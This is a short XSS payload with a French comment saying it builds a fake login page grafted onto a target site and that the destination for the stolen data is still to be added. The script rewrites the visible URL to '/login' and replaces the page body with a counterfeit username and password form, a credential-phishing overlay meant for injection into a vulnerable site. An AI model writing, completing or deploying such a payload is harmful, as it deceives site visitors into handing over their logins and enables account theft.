// ce script vas creer une fausse page de log qui vas se grepher sur le site. Il reste a rejouter vers où on veux envoyer les données.

<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
